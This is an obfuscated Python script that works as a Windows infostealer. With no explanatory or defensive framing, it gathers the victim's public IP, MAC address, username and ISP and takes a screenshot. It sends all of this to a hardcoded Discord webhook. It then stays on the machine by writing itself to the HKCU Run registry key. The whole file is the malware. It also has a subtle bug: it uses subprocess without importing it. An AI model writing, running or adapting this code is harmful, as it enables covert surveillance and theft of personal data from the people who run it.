D='screenshot.png'
C=print
import sys,os,requests as B,psutil,pyautogui as E,uuid,time,winreg as A,io
from PIL import ImageGrab
def F():
	D='install';B='pip'
	for A in['requests','psutil','pyautogui']:
		try:C(f"Checking {A}...");subprocess.check_call([sys.executable,'-m',B,D,A])
		except subprocess.CalledProcessError:C(f"Error installing {A}, retrying...");subprocess.check_call([sys.executable,'-m',B,D,A])
def G():A=B.get('https://api.ipify.org').text;C=':'.join(['{:02x}'.format(uuid.getnode()>>A&255)for A in range(0,12,2)]);D=os.getlogin();E=B.get('https://ipinfo.io').json().get('org');return A,C,D,E
def H():A=E.screenshot();A.save(D)
def I(ipv4,mac,username,isp):
	A='https://discord.com/api/webhooks/1304772721099669505/D1w_5hhWrJa9wXzcxibVrjmFnzRGYl97iuTSS2tfN3nav6f7C6mCxeDqTB_dk_sqBEv_';C={'content':f"**System Information:**\nIP Address: {ipv4}\nMAC Address: {mac}\nPC Username: {username}\nISP: {isp}"};B.post(A,json=C)
	with open(D,'rb')as E:B.post(A,files={'file':E})
def J():
	B=os.path.abspath(__file__);C=A.HKEY_CURRENT_USER;D='Software\\Microsoft\\Windows\\CurrentVersion\\Run'
	with A.OpenKey(C,D,0,A.KEY_WRITE)as E:A.SetValueEx(E,os.path.basename(B),0,A.REG_SZ,B)
if __name__=='__main__':F();K,L,M,N=G();H();I(K,L,M,N);J()
